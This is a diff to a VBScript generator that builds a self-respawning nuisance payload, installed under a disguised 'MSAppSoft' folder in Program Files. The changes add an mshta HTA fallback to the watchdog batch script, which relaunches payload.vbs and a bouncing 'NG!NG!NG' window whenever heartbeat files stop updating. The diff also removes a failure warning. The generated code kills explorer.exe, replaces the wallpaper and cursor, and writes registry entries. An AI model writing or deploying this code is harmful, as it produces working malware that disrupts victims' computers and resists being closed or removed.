@@ -4,7 +4,7 @@ Dim fso, sh, DEST, build, f, needElev, ie, ts
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 DEST  = sh.ExpandEnvironmentStrings("%ProgramFiles%") & "\MSAppSoft"
-build = sh.ExpandEnvironmentStrings("%TEMP%") & "\ngsbuild"
+build = sh.ExpandEnvironmentStrings("%SystemDrive%") & "\ngsbuild"
 
 ' ---- elevation check ----
 On Error Resume Next
@@ -89,7 +89,9 @@ ts.WriteLine "    del ""%DEST%\hb1.tmp"" ""%DEST%\hb2.tmp"" ""%DEST%\lol.run"" 2
 ts.WriteLine "    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" notice"
 ts.WriteLine "    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" alarm"
 ts.WriteLine ")"
-ts.WriteLine "if not exist ""%DEST%\hb2.tmp"" start """" ""%DEST%\ImNGsoft.exe"""
+ts.WriteLine "if not exist ""%DEST%\hb2.tmp"" ("
+ts.WriteLine "    if exist ""%DEST%\ImNGsoft.exe"" (start """" ""%DEST%\ImNGsoft.exe"") else (start """" mshta.exe ""%DEST%\ImNGsoft.hta"")"
+ts.WriteLine ")"
 ts.WriteLine "if not exist ""%DEST%\lol.run"" ("
 ts.WriteLine "    >""%DEST%\lol.run"" echo ."
 ts.WriteLine "    start """" wscript.exe //nologo ""%DEST%\payload.vbs"" lol"
@@ -119,7 +121,9 @@ ts.WriteLine "del ""%DEST%\hb1.tmp"" 2>nul"
 ts.WriteLine "del ""%DEST%\hb2.tmp"" 2>nul"
 ts.WriteLine "ping -n 8 127.0.0.1 >nul"
 ts.WriteLine "if not exist ""%DEST%\hb1.tmp"" start """" wscript.exe //nologo ""%DEST%\payload.vbs"" hide ""%DEST%\Start.bat"" resume"
-ts.WriteLine "if not exist ""%DEST%\hb2.tmp"" start """" ""%DEST%\ImNGsoft.exe"""
+ts.WriteLine "if not exist ""%DEST%\hb2.tmp"" ("
+ts.WriteLine "    if exist ""%DEST%\ImNGsoft.exe"" (start """" ""%DEST%\ImNGsoft.exe"") else (start """" mshta.exe ""%DEST%\ImNGsoft.hta"")"
+ts.WriteLine ")"
 ts.WriteLine "taskkill /f /im explorer.exe >nul 2>nul"
 ts.WriteLine "ping -n 4 127.0.0.1 >nul"
 ts.WriteLine "tasklist /fi ""imagename eq explorer.exe"" 2>nul | find /i ""explorer"" >nul || start """" explorer.exe"
@@ -188,9 +192,8 @@ ts.WriteLine "</style>"
 ts.WriteLine "</head>"
 ts.WriteLine "<body><div id=""t"">NG!NG!NG</div>"
 ts.WriteLine "<script>"
+ts.WriteLine "var HB=""" & Replace(DEST, "\", "\\") & "\\hb2.tmp"";"
 ts.WriteLine "var W=130,H=470,x=120,y=120,dx=6,dy=4,n=0,mx=0,my=0;"
-ts.WriteLine "var p=unescape(location.pathname).replace(/^\//,"""").replace(/\//g,""\\"");"
-ts.WriteLine "var dir=p.substring(0,p.lastIndexOf(""\\""));"
 ts.WriteLine "window.resizeTo(W,H);"
 ts.WriteLine "mx=Math.max(0,screen.availWidth-W); my=Math.max(0,screen.availHeight-H);"
 ts.WriteLine "function tick(){"
@@ -201,7 +204,7 @@ ts.WriteLine "  window.moveTo(x,y);"
 ts.WriteLine "  if(++n%25==0){"
 ts.WriteLine "    try{"
 ts.WriteLine "      var fso=new ActiveXObject(""Scripting.FileSystemObject"");"
-ts.WriteLine "      var f=fso.CreateTextFile(fso.BuildPath(dir,""hb2.tmp""),true); f.Write("".""); f.Close();"
+ts.WriteLine "      var f=fso.CreateTextFile(HB,true); f.Write("".""); f.Close();"
 ts.WriteLine "    }catch(e){}"
 ts.WriteLine "  }"
 ts.WriteLine "}"
@@ -259,7 +262,10 @@ If Err.Number <> 0 Then Die "RedWallPaper.bmp"
 MakeCur DEST & "\NCursor.cur"
 If Err.Number <> 0 Then Die "NCursor.cur"
 
-' ============================================================ assemble
+' ============================================================ hta copy + assemble
+fso.CopyFile build & "\ImNGsoft.hta", DEST & "\ImNGsoft.hta", True
+If Err.Number <> 0 Then Die "copy hta"
+
 ie = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\iexpress.exe"
 If Not fso.FileExists(ie) Then ie = "iexpress"
 sh.CurrentDirectory = build
@@ -269,8 +275,6 @@ If Not fso.FileExists(build & "\ImNGsoft.exe") Then
 End If
 If fso.FileExists(build & "\ImNGsoft.exe") Then
     fso.CopyFile build & "\ImNGsoft.exe", DEST & "\ImNGsoft.exe", True
-Else
-    MsgBox "iexpress did not produce ImNGsoft.exe.", vbExclamation, "gen.vbs"
 End If
 
 ' ============================================================ registry
@@ -301,8 +305,8 @@ sh.Run "rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True", 0, True
 
 ' ============================================================ verify
 If Not (fso.FileExists(DEST & "\Start.bat") And fso.FileExists(DEST & "\CheckSoft.bat") _
-    And fso.FileExists(DEST & "\payload.vbs") And fso.FileExists(DEST & "\RedWallPaper.bmp") _
-    And fso.FileExists(DEST & "\NCursor.cur") And fso.FileExists(DEST & "\ImNGsoft.exe")) Then
+    And fso.FileExists(DEST & "\payload.vbs") And fso.FileExists(DEST & "\ImNGsoft.hta") _
+    And fso.FileExists(DEST & "\RedWallPaper.bmp") And fso.FileExists(DEST & "\NCursor.cur")) Then
     MsgBox "Some files are missing in " & DEST, vbExclamation, "gen.vbs"
 End If
 
